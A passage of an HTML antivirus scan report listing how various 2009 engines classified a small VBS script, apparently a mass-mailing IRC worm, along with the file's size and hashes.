red;">Virus:VBS/Lofix</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">probably unknown SCRIPT</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">mIRC/Gen_VBS</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">VBS.Holiday.A@mm</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">VBS/Starmania</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">VBS.Starma.A</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">Worm.Hopalong</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">VBS/Starmania</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td>-</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">VBS.ManiaStar.A@mm</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td>-</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">VBS_GENERIC.009</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">IRC-Worm.VBS.Generic</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td>-</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 4566 bytes</td></tr><tr><td colspan="4">MD5...: db45536af4e9a1debccb73111fce3f3f</td></tr><tr><td colspan="4">SHA1..: d8dfd047f7ccfba137bd3932c6495d7c0fc88d2e</td></tr><tr><td colspan="4">SHA256: 8395975c4bb035252749c75cbcc49180046c474fe4fd3616af27e8c893f28d6f</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Unknown!</td></tr><tr><td colspan="4">PEInfo: -</td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr></table></span></div></body>
+</html>
